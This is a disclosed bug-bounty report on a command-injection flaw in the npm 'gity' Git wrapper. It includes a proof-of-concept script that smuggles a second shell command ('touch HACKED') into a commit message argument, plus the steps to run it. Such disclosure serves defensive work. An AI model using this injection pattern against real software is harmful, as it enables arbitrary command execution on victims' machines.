# [gity] RCE via insecure command formatting

## Report Details
- **Report ID**: 730111
- **URL**: https://hackerone.com/reports/730111
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-11-05T21:10:14.160Z
- **Disclosed**: 2020-09-24T19:22:21.263Z

## Reporter
- **Username**: mik317
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a `RCE` issue in the `gity` module.
It allows to execute `arbitrary commands remotely inside the victim's PC`

# Module
**module name:** `gity`
**version:** `1.0.5`
**npm page:** `https://www.npmjs.com/package/gity`

## Module Description
> A nice Git wrapper for Node.

## Module Stats
[~3/4] downloads in the last day
[21] downloads in the last week
[~100] downloads in the last month

## Vulnerability Description
The issue occurs because a `user input` is formatted inside a `command` that will be executed without any check. The issue arises here: https://github.com/stevenmiller888/gity/blob/master/lib/index.js#L85

## Steps To Reproduce:
1. Create the following PoC file:

```js
// poc.js
var Git = require('gity');
 
var git = Git()
  .add('*.js')
  .commit('-m "added js files";touch HACKED;#')
  .run();

```
1. Check there aren't files called `HACKED` 
1. Execute the following commands in another terminal:

```bash
npm i gity # Install affected module
node poc.js #  Run the PoC
```
1. Recheck the files: now `HACKED` has been created :) {F626758}

## Patch
> Don't format `commands` using insecure `user's inputs` :)

## Supporting Material/References:
- [OPERATING SYSTEM VERSION]: Kali Linux
- [NODEJS VERSION]: 10.16.3
- [NPM VERSION]: 6.0.9

# Wrap up
- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

`RCE` via command formatting on `gity`

## Attachments
- Screenshot_from_2019-11-05_22-07-27.png
